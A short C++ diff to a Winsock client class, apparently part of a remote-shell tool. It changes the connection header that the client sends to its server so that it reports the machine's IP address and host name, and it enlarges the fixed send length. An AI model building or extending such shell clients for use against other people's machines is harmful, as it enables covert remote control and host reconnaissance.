@@ -33,7 +33,7 @@ void ClientSocket::connect_server() {
 		WSACleanup();
 		exit(0);
 	}
-	send(this->main_socket, this->header.c_str(), header.size() + 1 != 43 ? 43 : header.size() + 1, 1);
+	send(this->main_socket, this->header.c_str(), header.size() + 1 != 128 ? 128 : header.size() + 1, 1);
 }
 
 ClientSocket::ClientSocket(std::string ip, int port) {
@@ -68,8 +68,9 @@ ClientSocket::ClientSocket() {
 		printf("Error creating socket: %ld\n", WSAGetLastError());
 	}
 	std::string ip_s = get_address();
-	std::string header = "Shell Client Joined ---- IP: " + ip_s;
-	this->header = header;
+	std::string name = get_host_name();
+	std::string header = "Client Joined ----->\nIP: ";
+	this->header = header.append(ip_s).append("\n").append("Name: ").append(name).append("\n");
 }
 void send_command(Socket sock) {
 	std::string sendbuf;
